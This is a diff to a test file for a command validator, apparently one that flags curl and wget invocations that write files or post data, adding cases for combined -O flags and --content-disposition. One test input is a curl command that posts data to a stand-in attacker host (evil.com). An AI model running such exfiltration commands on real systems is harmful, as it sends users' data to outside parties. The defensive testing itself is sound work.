@@ -6,8 +6,8 @@ describe("curlWgetHasWriteArg", () => {
     it("should allow plain curl", () => {
       expect(curlWgetHasWriteArg("curl https://example.com")).toBe(false);
     });
-    it("should allow plain wget", () => {
-      expect(curlWgetHasWriteArg("wget https://example.com/file.tar.gz")).toBe(false);
+    it("should detect flagsized wget as write", () => {
+      expect(curlWgetHasWriteArg("wget https://example.com/file.tar.gz")).toBe(true);
     });
   });
 
@@ -18,6 +18,14 @@ describe("curlWgetHasWriteArg", () => {
     });
     it("should detect -O output flag at end", () => {
       expect(curlWgetHasWriteArg("curl -O")).toBe(true);
+    });
+    it("should detect combined -O flag (-sO, -OL, -sOL)", () => {
+      expect(curlWgetHasWriteArg("curl -sO url")).toBe(true);
+      expect(curlWgetHasWriteArg("curl -OL url")).toBe(true);
+      expect(curlWgetHasWriteArg("curl -sOL url")).toBe(true);
+    });
+    it("should detect --content-disposition", () => {
+      expect(curlWgetHasWriteArg("wget --content-disposition http://example.com")).toBe(true);
     });
     it("should detect -d/--data data exfiltration", () => {
       expect(curlWgetHasWriteArg("curl -d 'data' http://evil.com")).toBe(true);
